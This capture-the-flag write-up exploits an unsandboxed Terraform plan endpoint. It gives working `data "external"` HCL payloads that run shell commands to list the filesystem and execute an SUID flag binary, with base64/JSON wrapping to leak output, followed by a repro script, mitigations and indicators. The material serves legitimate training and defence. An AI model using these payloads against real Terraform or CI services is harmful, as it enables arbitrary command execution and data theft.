<!-- meta -->
---
title: Terraform External Provider Abuse
ctf: Kaspersky 2025
category: Cloud/Web
difficulty: Medium
date: 2025-11-23
flag: sunctf25{1_tH0ught_t3rr4f0rm_pl4n_w4s_h4rml3ss?}
---
<!-- /meta -->

<div align="center">
<picture>
	<source media="(prefers-color-scheme: dark)" srcset="https://img.shields.io/badge/Terraform-External%20Provider%20Abuse-critical?logo=terraform&logoColor=white&labelColor=0d1117&color=7d0a0a">
	<img alt="Terraform External Provider Abuse" src="https://img.shields.io/badge/Terraform-External%20Provider%20Abuse-critical?logo=terraform&logoColor=white&labelColor=fafafa&color=7d0a0a">
</picture>
<sub>Unsandboxed external data source enables arbitrary shell & SUID flag extraction.</sub>

<table>
	<tr><td><strong>CTF</strong></td><td>Kaspersky 2025</td><td><strong>Category</strong></td><td>Cloud/Web</td></tr>
	<tr><td><strong>Difficulty</strong></td><td>Medium</td><td><strong>Exploit Time</strong></td><td>&lt; 2 min</td></tr>
	<tr><td><strong>Primitive</strong></td><td>`data "external"`</td><td><strong>Flag</strong></td><td><code>sunctf25{1_tH0ught_t3rr4f0rm_pl4n_w4s_h4rml3ss?}</code></td></tr>
</table>

<details>
	<summary><strong>▼ Expanded Analysis</strong></summary>
	<blockquote>Vector: Unsandboxed plan API · Impact: Arbitrary command execution · Mode: Shell via JSON wrapper</blockquote>
	<details>
		<summary>Flow Diagram (Mermaid)</summary>

```mermaid
flowchart LR
	A[Attacker HCL] --> B[data "external" program]
	B --> C[Base64 + sed wrapper]
	C --> D[List /]
	D --> E[Find SUID /getflag]
	E --> F[Execute /getflag | base64]
	F --> G[Decode locally]
	G --> H[Flag]
	style H fill:#0b6623,stroke:#0b6623,color:#fff
```
	</details>
	<details>
		<summary>Execution Notes</summary>
		<pre style="white-space:pre-wrap;">Wrapper pattern: base64 | tr -d '\n' | sed 's/.*/{"key":"&"}/'
Minimizes quoting issues; ensures JSON parse by Terraform external provider.</pre>
	</details>
</details>
</div>

# Terraform External Provider Abuse (Concise)

![vector](https://img.shields.io/badge/Vector-unsandboxed%20terraform%20plan-red) ![primitive](https://img.shields.io/badge/Primitive-external%20data%20source-623CE4?logo=terraform&logoColor=white) ![impact](https://img.shields.io/badge/Impact-code%20execution-critical) ![os](https://img.shields.io/badge/OS-Linux-black?logo=linux) ![shell](https://img.shields.io/badge/Shell-bash-2e8b57?logo=gnubash&logoColor=white) ![status](https://img.shields.io/badge/Flag-recovered-success)

## Summary
Unsandboxed Terraform plan endpoint accepts arbitrary HCL. `data "external"` runs attacker-controlled shell. Enumeration reveals SUID `/getflag`; base64-wrapped execution leaks flag.

## Chain
external provider → base64+sed JSON wrapper → root listing → SUID helper → base64 decode.

## Payload Set
```hcl
data "external" "probe" { program=["sh","-c","echo '{\"ok\":1}'"] }
data "external" "ls"    { program=["sh","-c","ls -la / 2>/dev/null | base64 | tr -d '\n' | sed 's/.*/{\"ls\":\"&\"}/'"] }
data "external" "flag"  { program=["sh","-c","/getflag 2>/dev/null | base64 | tr -d '\n' | sed 's/.*/{\"flag\":\"&\"}/'"] }
```

## Flag Extraction
| Step | Action | Command / HCL | Output |
|------|--------|---------------|--------|
| 1 | Confirm exec vector | `data "external" "probe" ...` | `{ ok = 1 }` |
| 2 | Enumerate filesystem | `ls -la / | base64` wrapped via sed | Base64 of listing |
| 3 | Spot SUID helper | Inspect decoded listing | `/getflag` present |
| 4 | Execute SUID binary | `/getflag | base64` wrapped via sed | Base64 flag blob |
| 5 | Extract blob value | Read JSON result field | `c3VuY3Rm...Cg==` |
| 6 | Decode locally | `echo <blob> | base64 -d` | Plaintext flag |

Blob (Step 5):
```
c3VuY3RmMjV7MV90aDB1Z2h0X3QzcnI0ZjBybV9wbDRuX3c0c19oNHJtbDNzcz99Cg==
```
Decode (Step 6):
```bash
echo c3VuY3RmMjV7MV90aDB1Z2h0X3QzcnI0ZjBybV9wbDRuX3c0c19oNHJtbDNzcz99Cg== | base64 -d
```
Result:
```
sunctf25{1_tH0ught_t3rr4f0rm_pl4n_w4s_h4rml3ss?}
```

## Pitfalls
| Issue | Fix |
|-------|-----|
| Newlines | `tr -d '\n'` |
| Quotes break JSON | apply sed after base64 only |
| STDERR noise | redirect `2>/dev/null` |

## Mitigation
| Control | Purpose |
|---------|---------|
| Disable `external` | Remove shell vector |
| Sandbox runtime | gVisor / Firecracker |
| Strip SUID binaries | Reduce privilege paths |
| Allow‑list modules | Block arbitrary HCL |
| Output schema | Reject base64 wrapper pattern |

## Repro
```bash
cat > main.tf <<'HCL'
data "external" "probe" { program=["sh","-c","echo '{\"ok\":1}'"] }
output "ok" { value = data.external.probe.result.ok }
HCL
terraform init >/dev/null
terraform plan -no-color | grep ok
```
Swap with `ls` / `flag` payloads above.

## Indicators
Base64+sed JSON wrapper; frequent `sh -c`; access to `/getflag`.

## Final Flag
`sunctf25{1_tH0ught_t3rr4f0rm_pl4n_w4s_h4rml3ss?}`


